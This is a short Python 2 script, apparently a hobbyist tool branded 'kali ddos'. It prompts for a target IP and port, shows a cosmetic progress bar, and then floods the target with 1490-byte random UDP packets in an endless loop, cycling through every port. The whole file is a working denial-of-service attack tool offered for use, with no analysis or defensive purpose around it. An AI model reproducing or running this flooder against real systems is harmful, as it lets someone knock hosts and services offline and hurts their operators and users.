import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet kali ddos")
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack")
print "[                    ] 0% "
time.sleep(1)
print "[==                  ] 10%"
time.sleep(1)
print "[=====               ] 39%"
time.sleep(1)
print "[==========          ] 51%"
time.sleep(1)
print "[==============      ] 69%"
time.sleep(1)
print "[==================  ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
#kali.linux.boys
